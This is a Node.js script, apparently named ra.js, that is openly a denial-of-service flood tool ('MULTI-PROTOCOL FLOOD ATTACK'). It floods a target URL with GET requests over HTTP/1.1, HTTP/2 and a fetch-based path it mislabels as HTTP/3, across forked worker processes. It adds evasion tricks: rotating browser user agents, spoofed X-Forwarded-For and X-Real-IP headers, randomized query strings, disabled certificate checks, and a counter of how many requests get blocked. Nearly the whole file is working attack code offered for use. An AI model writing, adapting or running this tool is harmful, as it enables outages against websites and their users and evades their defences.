const net = require("net");
const http = require("http");
const https = require("https");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 6){
    console.log(`Usage: node ra.js URL TIME REQ_PER_SEC THREADS\nExample: node ra.js https://example.com/ 120 16 4`);
    console.log(`Note: This runs HTTP/1.1 + HTTP/2 + HTTP/3 simultaneously`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);

// ==================== TLS CONFIG ====================
const ciphersTLS = [
    "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305", "DHE-RSA-AES256-GCM-SHA384"
].join(":");

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED;

const secureContext = tls.createSecureContext({
    ciphers: ciphersTLS,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

// ==================== DATA ====================
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

// ==================== STATS PER PROTOCOL ====================
let stats = {
    h1: { total: 0, success: 0, blocked: 0, error: 0, active: 0 },
    h2: { total: 0, success: 0, blocked: 0, error: 0, active: 0 },
    h3: { total: 0, success: 0, blocked: 0, error: 0, active: 0 }
};

// ==================== HELPERS ====================
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIP() {
    return `${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}.${randomIntn(1,255)}`;
}

function getRandomPath() {
    return parsedTarget.path + 
        (Math.random() > 0.5 ? "?" + randomString(randomIntn(5,12)) + "=" + randomString(randomIntn(4,10)) : "");
}

// ==================== HTTP/1.1 ATTACKER ====================
function runHTTP1() {
    stats.h1.active++;
    
    const agent = new https.Agent({
        keepAlive: true,
        maxSockets: 50,
        secureContext: secureContext,
        rejectUnauthorized: false
    });

    const startTime = Date.now();
    
    const interval = setInterval(() => {
        if (Date.now() - startTime > args.time * 1000) {
            clearInterval(interval);
            agent.destroy();
            stats.h1.active--;
            return;
        }

        const options = {
            hostname: parsedTarget.hostname,
            port: 443,
            path: getRandomPath(),
            method: "GET",
            headers: {
                "Host": parsedTarget.host,
                "User-Agent": randomElement(userAgents),
                "Accept": randomElement(acceptHeaders),
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "X-Forwarded-For": randomIP(),
                "X-Real-IP": randomIP(),
                "Referer": `https://${parsedTarget.host}/`
            },
            agent: agent
        };

        const req = https.request(options, (res) => {
            stats.h1.total++;
            if ([200, 301, 302, 304].includes(res.statusCode)) stats.h1.success++;
            else if ([403, 503, 429, 401].includes(res.statusCode)) stats.h1.blocked++;
            else stats.h1.error++;
            res.destroy();
        });

        req.on("error", () => {
            stats.h1.total++;
            stats.h1.error++;
        });

        req.setTimeout(5000, () => req.destroy());
        req.end();
    }, Math.max(1, Math.floor(1000 / (args.Rate / 3))));
}

// ==================== HTTP/2 ATTACKER ====================
function runHTTP2() {
    stats.h2.active++;
    
    const tlsOptions = {
        port: 443,
        ALPNProtocols: ["h2", "http/1.1"],
        ciphers: ciphersTLS,
        honorCipherOrder: true,
        host: parsedTarget.host,
        rejectUnauthorized: false,
        secureOptions: secureOptions,
        secureContext: secureContext,
        servername: parsedTarget.host,
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3"
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 60000);

    tlsConn.once("secureConnect", () => {
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            createConnection: () => tlsConn
        });

        const startTime = Date.now();
        
        const interval = setInterval(() => {
            if (Date.now() - startTime > args.time * 1000) {
                clearInterval(interval);
                client.destroy();
                stats.h2.active--;
                return;
            }

            const req = client.request({
                ":method": "GET",
                ":path": getRandomPath(),
                ":scheme": "https",
                ":authority": parsedTarget.host,
                "user-agent": randomElement(userAgents),
                "accept": randomElement(acceptHeaders),
                "x-forwarded-for": randomIP()
            });

            req.on("response", (headers) => {
                stats.h2.total++;
                const status = headers[":status"];
                if ([200, 301, 302, 304].includes(status)) stats.h2.success++;
                else if ([403, 503, 429, 401].includes(status)) stats.h2.blocked++;
                else stats.h2.error++;
                req.close();
            });

            req.on("error", () => {
                stats.h2.total++;
                stats.h2.error++;
            });

            req.setTimeout(5000, () => req.close());
            req.end();
        }, Math.max(1, Math.floor(1000 / (args.Rate / 3))));
    });

    tlsConn.on("error", () => {
        stats.h2.active--;
    });
}

// ==================== HTTP/3 ATTACKER (Simulated via fetch) ====================
function runHTTP3() {
    stats.h3.active++;
    
    const startTime = Date.now();
    
    const interval = setInterval(async () => {
        if (Date.now() - startTime > args.time * 1000) {
            clearInterval(interval);
            stats.h3.active--;
            return;
        }

        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(args.target + getRandomPath(), {
                method: "GET",
                headers: {
                    "User-Agent": randomElement(userAgents),
                    "Accept": randomElement(acceptHeaders),
                    "X-Forwarded-For": randomIP()
                },
                signal: controller.signal
            });
            
            clearTimeout(timeout);
            stats.h3.total++;
            
            if ([200, 301, 302].includes(response.status)) stats.h3.success++;
            else if ([403, 503, 429].includes(response.status)) stats.h3.blocked++;
            else stats.h3.error++;
            
        } catch (e) {
            stats.h3.total++;
            stats.h3.error++;
        }
    }, Math.max(1, Math.floor(1000 / (args.Rate / 3))));
}

// ==================== MASTER PROCESS ====================
if (cluster.isMaster) {
    console.log(`🔥 MULTI-PROTOCOL FLOOD ATTACK`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️  Duration: ${args.time} seconds`);
    console.log(`⚡ Total Rate: ${args.Rate} req/sec (divided across 3 protocols)`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`📊 Protocols: HTTP/1.1 + HTTP/2 + HTTP/3`);
    console.log(`🔒 Method: GET ONLY (All Protocols)`);
    console.log(`====================================\n`);

    // Stats display
    setInterval(() => {
        const total = stats.h1.total + stats.h2.total + stats.h3.total;
        const success = stats.h1.success + stats.h2.success + stats.h3.success;
        const blocked = stats.h1.blocked + stats.h2.blocked + stats.h3.blocked;
        const error = stats.h1.error + stats.h2.error + stats.h3.error;
        const active = stats.h1.active + stats.h2.active + stats.h3.active;

        console.clear();
        console.log(`🔥 MULTI-PROTOCOL FLOOD - ${new Date().toLocaleTimeString()}`);
        console.log(`====================================`);
        console.log(`📊 OVERALL: Total=${total} | ✅=${success} | 🚫=${blocked} | ❌=${error} | 🔗=${active}`);
        console.log(`------------------------------------`);
        console.log(`🌐 HTTP/1.1: ${stats.h1.total} req | ✅${stats.h1.success} | 🚫${stats.h1.blocked} | ❌${stats.h1.error} | 🔗${stats.h1.active}`);
        console.log(`🚀 HTTP/2:   ${stats.h2.total} req | ✅${stats.h2.success} | 🚫${stats.h2.blocked} | ❌${stats.h2.error} | 🔗${stats.h2.active}`);
        console.log(`⚡ HTTP/3:   ${stats.h3.total} req | ✅${stats.h3.success} | 🚫${stats.h3.blocked} | ❌${stats.h3.error} | 🔗${stats.h3.active}`);
        console.log(`====================================`);
    }, 2000);

    // Spawn workers
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log(`\n✅ Attack Complete!`);
        process.exit(0);
    }, args.time * 1000);

} else {
    // Worker: Jalankan semua 3 protocol secara parallel
    console.log(`Worker ${cluster.worker.id} starting triple-protocol flood...`);
    
    // Bagi rate per protocol (Rate / 3)
    const ratePerProtocol = Math.max(1, Math.floor(args.Rate / 3));
    
    // Jalankan HTTP/1.1
    setTimeout(() => runHTTP1(), 0);
    
    // Jalankan HTTP/2  
    setTimeout(() => runHTTP2(), 100);
    
    // Jalankan HTTP/3
    setTimeout(() => runHTTP3(), 200);
}

// Error handlers
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
